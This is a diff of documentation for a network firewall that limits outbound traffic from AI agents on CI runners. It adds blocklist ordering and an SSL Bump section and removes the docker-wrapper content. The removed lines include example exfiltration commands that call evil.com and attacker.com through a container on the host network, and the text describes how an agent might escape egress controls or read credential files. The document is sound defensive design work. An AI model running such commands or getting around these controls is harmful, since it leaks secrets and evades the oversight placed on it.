@@ -23,7 +23,6 @@ This firewall solves a specific problem: **egress control for AI agents running 
 - **Full filesystem access**: Agents read and write files freely. If your threat model requires filesystem isolation, you need additional controls.
 - **Localhost communication**: Required for stdio-based MCP servers running alongside the agent.
 - **DNS to trusted servers only**: DNS queries are restricted to configured DNS servers (default: Google DNS). This prevents DNS-based data exfiltration to attacker-controlled DNS servers.
-- **Docker socket access**: The agent can spawn containers—we intercept and constrain them, but the capability exists.
 
 ---
 
@@ -95,7 +94,13 @@ graph TB
 
 **Container iptables (NAT table)** — Inside the agent container, NAT rules intercept outbound HTTP (port 80) and HTTPS (port 443) traffic, rewriting the destination to Squid at `172.30.0.10:3128`. This handles traffic from the agent process itself and any child processes (including stdio MCP servers).
 
-**Squid ACL** — The primary control point. Squid receives CONNECT requests, extracts the target domain from SNI (for HTTPS) or Host header (for HTTP), and checks against the allowlist. Unlisted domains get `403 Forbidden`. No SSL inspection—we read SNI from the TLS ClientHello without decrypting traffic.
+**Squid ACL** — The primary control point. Squid receives CONNECT requests, extracts the target domain from SNI (for HTTPS) or Host header (for HTTP), and checks against the allowlist and blocklist. The evaluation order is:
+
+1. **Blocklist check first**: If domain matches a blocked pattern, deny immediately
+2. **Allowlist check second**: If domain matches an allowed pattern, permit
+3. **Default deny**: All other domains get `403 Forbidden`
+
+This allows fine-grained control like allowing `*.example.com` while blocking `internal.example.com`. No SSL inspection—we read SNI from the TLS ClientHello without decrypting traffic.
 
 ---
 
@@ -117,9 +122,13 @@ sequenceDiagram
     NAT->>Squid: TCP to proxy port
 
     Squid->>Squid: Parse CONNECT api.github.com:443
-    Squid->>Squid: Check domain against ACL
+    Squid->>Squid: Check blocklist first
+    Squid->>Squid: Check allowlist second
 
-    alt api.github.com in allowlist
+    alt Domain in blocklist
+        Squid-->>Agent: HTTP 403 Forbidden
+        Note over Agent: Blocked by blocklist
+    else Domain in allowlist
         Squid->>Host: Outbound to api.github.com:443
         Note over Host: Source is Squid IP (172.30.0.10)<br/>→ ACCEPT (unrestricted)
         Host->>Net: TCP connection
@@ -128,7 +137,7 @@ sequenceDiagram
         Note over Agent,Net: End-to-end encrypted tunnel
     else Domain not in allowlist
         Squid-->>Agent: HTTP 403 Forbidden
-        Note over Agent: Connection refused
+        Note over Agent: Not in allowlist
     end
 ```
 
@@ -136,25 +145,9 @@ The agent never connects directly to the internet. Even if it explicitly tries t
 
 ---
 
-## The Tricky Bits: Spawned Containers
+## Host DOCKER-USER Chain
 
-The hardest problem we solve is constraining containers the agent spawns dynamically. An agent might run `docker run --network=host alpine curl attacker.com` to escape the firewall network entirely.
-
-We handle this at two levels:
-
-### docker-wrapper.sh
-
-A shell script symlinked at `/usr/bin/docker` inside the agent container (real Docker CLI at `/usr/bin/docker-real`). It intercepts all `docker run` commands and:
-
-1. **Strips dangerous network flags**: `--network=host`, `--net=host`, `--network=bridge`
-2. **Injects `--network=awf-net`**: Forces the container onto our controlled network
-3. **Injects proxy environment variables**: `HTTP_PROXY`, `HTTPS_PROXY` pointing to Squid
-
-The agent and its MCP servers see normal Docker behavior; they don't know their network requests are being rewritten.
-
-### Host DOCKER-USER Chain
-
-Even with docker-wrapper, we don't fully trust it—an agent could theoretically find the real Docker binary or exploit a wrapper bug. The DOCKER-USER chain provides a backstop:
+The host-level DOCKER-USER chain provides a critical security layer for all containers on the awf-net network:
 
 ```bash
 # Simplified rules (actual implementation in src/host-iptables.ts)
@@ -166,15 +159,72 @@ iptables -A FW_WRAPPER -p tcp -d 172.30.0.10 -j ACCEPT             # Traffic to 
 iptables -A FW_WRAPPER -j DROP                                      # Everything else blocked
 ```
 
-Any container on `awf-net`—whether we created it or the agent spawned it—has its egress filtered. Traffic either goes through Squid or gets dropped.
+Any container on `awf-net` has its egress filtered. Traffic either goes through Squid or gets dropped.
 
 ### Why Not a Network Namespace Jail?
 
-We considered isolating the agent in a network namespace with zero external connectivity, proxying everything through a sidecar. This fails for MCP servers that spawn child processes or containers—each would need its own namespace setup. The iptables + proxy approach handles arbitrary process trees transparently.
+We considered isolating the agent in a network namespace with zero external connectivity, proxying everything through a sidecar. This fails for MCP servers that spawn child processes—each would need its own namespace setup. The iptables + proxy approach handles arbitrary process trees transparently.
 
 ### Why Squid Over mitmproxy?
 
 mitmproxy would let us inspect HTTPS payloads, potentially catching exfiltration in POST bodies. But it requires injecting a CA certificate and breaks certificate pinning (common in security-sensitive clients). Squid's CONNECT method reads SNI without decryption—less powerful but zero client-side changes, and we maintain end-to-end encryption.
+
+:::tip[SSL Bump for URL Filtering]
+When you need URL path filtering (not just domain filtering), enable `--ssl-bump`. This uses Squid's SSL Bump feature with a per-session CA certificate, providing full URL visibility while maintaining security through short-lived, session-specific certificates.
+:::
+
+---
+
+## SSL Bump Security Model
+
+When `--ssl-bump` is enabled, the firewall intercepts HTTPS traffic for URL path filtering. This changes the security model significantly.
+
+### How SSL Bump Works
+
+1. **CA Generation**: A unique CA key pair is generated at session start
+2. **Trust Store Injection**: The CA certificate is added to the agent container's trust store
+3. **TLS Interception**: Squid terminates TLS and re-establishes encrypted connections to destinations
+4. **URL Filtering**: Full request URLs (including paths) become visible for ACL matching
+
+### Security Safeguards
+
+| Safeguard | Description |
+|-----------|-------------|
+| **Per-session CA** | Each awf execution generates a unique CA certificate |
+| **Short validity** | CA certificate valid for 1 day maximum |
+| **Ephemeral key storage** | CA private key exists only in temp directory, deleted on cleanup |
+| **Container-only trust** | CA injected only into agent container, not host system |
+
+### Trade-offs vs. SNI-Only Mode
+
+| Aspect | SNI-Only (Default) | SSL Bump |
+|--------|-------------------|----------|
+| Filtering granularity | Domain only | Full URL path |
+| End-to-end encryption | ✓ Preserved | Modified (proxy-terminated) |
+| Certificate pinning | Works | Broken |
+| Proxy visibility | Domain:port | Full request (URL, headers) |
+| Performance | Faster | Slight overhead |
+
+:::caution[When to Use SSL Bump]
+Only enable SSL Bump when you specifically need URL path filtering. For most use cases, domain-based filtering provides sufficient control with stronger encryption guarantees.
+:::
+
+### SSL Bump Threat Considerations
+
+**What SSL Bump enables:**
+- Fine-grained access control (e.g., allow only `/githubnext/*` paths)
+- Better audit logging with full URLs
+- Detection of path-based exfiltration attempts
+
+**What SSL Bump exposes:**
+- Full HTTP request/response content visible to proxy
+- Applications with certificate pinning will fail
+- Slightly increased attack surface (CA key compromise)
+
+**Mitigations:**
+- CA key never leaves the temporary work directory
+- Session isolation: each execution uses a fresh CA
+- Automatic cleanup removes all key material
 
 ---
 
@@ -185,11 +235,10 @@ mitmproxy would let us inspect HTTPS payloads, potentially catching exfiltration
 | **Squid container** | Crashes or hangs | Agent traffic can't reach proxy, connections time out | Fail-secure |
 | **Agent container** | Crashes | No agent traffic to filter | Fail-secure |
 | **Container NAT rules** | Not applied (entrypoint fails) | Agent traffic goes direct, but hits DOCKER-USER DROP | Fail-secure |
-| **Host DOCKER-USER rules** | Removed by attacker with root | Spawned containers bypass proxy | **Fail-open** |
+| **Host DOCKER-USER rules** | Removed by attacker with root | Traffic bypasses proxy | **Fail-open** |
 | **DNS** | Unreachable | Name resolution fails, agent can't connect anywhere | Fail-secure |
-| **docker-wrapper.sh** | Bypassed or buggy | Spawned container tries wrong network, but DOCKER-USER blocks | Fail-secure |
 
-The host iptables rules are our single point of fail-open vulnerability. If an attacker gains root on the runner and clears DOCKER-USER, spawned containers escape filtering. We accept this because:
+The host iptables rules are our single point of fail-open vulnerability. If an attacker gains root on the runner and clears DOCKER-USER, traffic escapes filtering. We accept this because:
 
 1. Root on the runner means the attacker already won (they can read secrets, modify code, etc.)
 2. GitHub Actions runners are ephemeral—rules are reestablished each job
@@ -212,19 +261,6 @@ The agent, processing this issue, executes the command.
 curl: (56) Received HTTP code 403 from proxy after CONNECT
 ```
 Squid logs the attempt with timestamp, source IP, and full URL. The token never leaves the runner.
-
-### Agent Spawns Evasion Container
-
-**Attack:** Agent runs:
-```bash
-docker run --rm --network=host alpine sh -c 'wget -q -O- https://evil.com/exfil?data=...'
-```
-
-**Mitigation:** docker-wrapper.sh intercepts, rewrites to:
-```bash
-docker run --rm --network=awf-net -e HTTP_PROXY=... -e HTTPS_PROXY=... alpine sh -c '...'
-```
-Container joins `awf-net`, egress hits DOCKER-USER, routes through Squid, blocked by ACL.
 
 ### DNS Tunneling
 
@@ -251,8 +287,6 @@ DNS tunneling through the *allowed* DNS servers (encoding data in query names to
 **Filesystem access is unrestricted.** The agent can read `~/.ssh/id_rsa`, `~/.aws/credentials`, environment variables, and any file the runner user can access. If your secrets are on disk, they're accessible. Use GitHub Actions secrets (injected as env vars) and consider what files exist on your runners.
 
 **Non-HTTP protocols are blocked, not filtered.** SSH (port 22), raw TCP, custom protocols—all dropped by iptables. We don't inspect them for allowed destinations. If your agent needs SSH access to specific hosts, you'll need additional rules.
-
-**Docker socket grants significant privilege.** The agent can spawn containers, inspect the Docker daemon, potentially escape to host in some configurations. We mitigate network escape but not Docker escape. For truly untrusted code, consider gVisor or Kata Containers.
 
 **Single-runner scope.** The firewall protects one workflow job on one runner. It doesn't coordinate across parallel jobs or provide organization-wide policy. Each job configures its own allowlist.
 
@@ -305,6 +339,5 @@ Use `sudo -E` to preserve environment variables (like `GITHUB_TOKEN`) through su
 
 ## Related Documentation
 
-- [Architecture Overview](/reference/architecture) — Component details and code structure
-- [CLI Reference](/reference/cli-options) — Complete command-line options
-- [Logging](/guides/logging) — Audit trail configuration and analysis
+- [Domain Filtering](/gh-aw-firewall/guides/domain-filtering/) — Allowlists, blocklists, and wildcard patterns
+- [CLI Reference](/gh-aw-firewall/reference/cli-reference/) — Complete command-line options
